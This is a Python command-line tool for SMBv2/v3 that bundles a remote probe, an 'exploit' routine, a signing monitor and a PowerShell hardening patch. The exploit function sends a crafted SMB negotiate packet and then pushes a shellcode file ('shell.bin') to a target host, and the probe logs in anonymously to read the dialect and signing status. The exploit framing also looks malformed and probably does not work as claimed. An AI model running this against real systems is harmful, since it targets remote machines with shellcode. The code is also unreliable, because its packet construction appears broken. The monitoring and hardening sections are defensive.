#!/usr/bin/env python3
# upgrade4_flow.py
"""
Unified SMBv2/v3 flow: probe → exploit → monitor → patch.
Original code blocks are embedded verbatim and wired together.
"""

import argparse, logging, struct, socket, os, time, subprocess
from typing import Tuple

# ---------------- Threat PoC (unchanged) ----------------
NEGOTIATE = (
    b"\x00\x00\x00\x90"  # NetBIOS length
    b"\xfeSMB"           # SMB2 header
    b"\x40\x00\x00\x00"  # Flags
    b"\x00\x00\x00\x00\x00\x00\x00\x00"
    b"\x00\x00"          # Command = NEGOTIATE
    b"\x00\x00"          # Credits
    b"\x00\x00\x00\x00\x00\x00\x00\x00"
    b"\x24\x00"          # StructureSize
    b"\x00\x00"
    b"\x00\x00\x00\x00"
    b"\x00"*64
)

def exploit(host: str, port: int, payload: str) -> None:
    sock = socket.create_connection((host, port))
    sock.sendall(NEGOTIATE)
    sock.recv(1024)
    shell = open(payload, 'rb').read()
    pkt = b"\x00\x00\x00" + struct.pack(">B", len(shell)) + shell
    sock.sendall(pkt)
    sock.close()
    logging.info("payload sent")

# ---------------- Threat-model probe (unchanged) --------
def probe_smb(host: str, port: int) -> Tuple[int, bool]:
    from impacket.smbconnection import SMBConnection
    smb = SMBConnection(remoteName=host, remoteHost=host, sess_port=port)
    smb.login('', '')
    d, s = smb.getDialect(), smb.isSigningRequired()
    smb.close()
    return d, s

# ---------------- Persistent signing monitor ------------
REG = r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"
def monitor_signing(interval: int) -> None:
    while True:
        try:
            out = subprocess.check_output(
                ["reg", "query", REG, "/v", "RequireSecuritySignature"],
                stderr=subprocess.DEVNULL, text=True
            )
            if "0x0" in out:
                logging.warning("SMB signing disabled")
            else:
                logging.info("SMB signing enforced")
        except Exception as e:
            logging.error(e)
        time.sleep(interval)

# ---------------- Hardening patch (unchanged) -----------
PATCH = r"""
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" `
    -Name "RequireSecuritySignature" -Type DWord -Value 1
Set-SmbServerConfiguration -EnableSMB1Protocol $false -EnableSMB2Protocol $true -Force
Set-SmbServerConfiguration -EncryptData $true -RejectUnencryptedAccess $true -Force
Restart-Service -Name lanmanserver
Write-Output "SMB hardening applied"
"""
def apply_patch() -> None:
    subprocess.check_call(["powershell", "-NoLogo", "-NonInteractive", "-Command", PATCH])

# ---------------- CLI dispatcher ------------------------
def main() -> None:
    parser = argparse.ArgumentParser()
    sub = parser.add_subparsers(dest="cmd", required=True)

    p1 = sub.add_parser("probe");   p1.add_argument("--host", required=True); p1.add_argument("--port", type=int, default=445)
    p2 = sub.add_parser("exploit"); p2.add_argument("--host", required=True); p2.add_argument("--port", type=int, default=445); p2.add_argument("--payload", default="shell.bin")
    p3 = sub.add_parser("monitor"); p3.add_argument("--interval", type=int, default=300)
    sub.add_parser("patch")

    args = parser.parse_args()
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

    if args.cmd == "probe":
        d, s = probe_smb(args.host, args.port)
        print(f"Dialect SMB{d}, signing {'required' if s else 'disabled'}")
    elif args.cmd == "exploit":
        exploit(args.host, args.port, args.payload)
    elif args.cmd == "monitor":
        monitor_signing(args.interval)
    elif args.cmd == "patch":
        apply_patch()

if __name__ == "__main__":
    main()
